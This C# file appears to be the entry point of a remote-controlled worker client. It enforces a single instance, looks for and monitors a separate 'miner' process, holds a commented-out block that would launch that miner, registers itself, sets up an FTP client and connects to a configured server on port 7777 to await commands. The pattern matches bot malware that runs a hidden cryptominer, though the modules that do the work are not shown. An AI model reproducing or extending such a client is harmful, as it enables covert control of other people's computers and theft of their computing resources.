using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Interfaces;
using Service;

namespace ClientWorker
{
	internal class Program
	{
        public static Client netSender;
        public static string nameProc;
        private static readonly ManualResetEventSlim _OnResponce = new ManualResetEventSlim(false);
        static public ChatForm chat;
        private static void Main()
		{
            
            //WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            //bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //chat = new ChatForm();
            //chat.SetLabel(hasAdministrativeRight.ToString());
            //Thread myThread = new Thread(() => Application.Run(chat)); //Создаем новый объект потока (Thread)

            //myThread.Start(); //запускаем поток
            OnProgramLoad();



            netSender = new Client();
            //netSender.Host = "localhost";
            netSender.Host = StartData.currentServer;
            netSender.Port = 7777;
            netSender.Events.OnError = OnError;
            netSender.Events.OnBark = OnBark;
            netSender.Connect(false);


            _OnResponce.Wait();
        }

        private static void OnBark(int obj)
        {
            Log.Send("OnBark Invoke!");
        }

        private static void OnError(Exception obj)
        {
            Log.Send("OnError Invoke!" + obj.Message);
        }

        private static void OnProgramLoad()
        {
            Log.DetermineLogParth();
            Log.Send("===================================ЗАПУСК===================================");

            if (CheckOtherWorkerAndMiner())
            {
                Environment.Exit(0);
            }            

            nameProc = GetProcessName();
            SetParametrsSetting();
            Functions.Registration();
            FtpClient.Init();
        }
        private static string GetProcessName()
        {
            string result = "";

            try
            {
                string[] array = Application.ExecutablePath.ToString().Split('\\');
                result = array[array.Length - 1];
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка получения имени процесса " + ex.Message);
            }

            return result;
        }
        private static bool CheckOtherWorkerAndMiner()
        {
            bool result = false;

            int num = 0;
            bool isM = false;
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule.FileVersionInfo.FileDescription == StartData.DescriptionProcess)
                    {
                        num++;
                    }
                    if (process.MainModule.FileVersionInfo.FileDescription == StartData.MProcDescription)
                    {
                        isM = true;
                        MClass.isWorking = true;
                        MClass.MProcess = process;
                        MClass.MProcess.EnableRaisingEvents = true;
                        MClass.MProcess.Exited += new EventHandler(MClass.MExited);
                    }
                }
                catch (Exception ex)
                {
                    Log.Send(ex.Message);
                }
            }

            //if (!isM && Service.Properties.Settings.Default.IsMiner)
            //{
            //    try
            //    {
            //        MClass.Start();
            //    }
            //    catch (Exception ex) { Log.Send(ex.Message); }
            //}


            if (num > 1)
            {
                result = true;
            }
            return result;
        }

        private static void SetParametrsSetting()
        {
            Service.Properties.Settings.Default.Open_sum++;
            Service.Properties.Settings.Default.Start_time = DateTime.Now;          
            if (Service.Properties.Settings.Default.Comp_name == "")
            {
                Service.Properties.Settings.Default.Comp_name = "Name_" + Service.Properties.Settings.Default.Start_time.ToString();
            }
            if (Service.Properties.Settings.Default.Key == "")
            {
                StartData.GenerateKey();
            }

            Service.Properties.Settings.Default.Save();
        }
    }
}
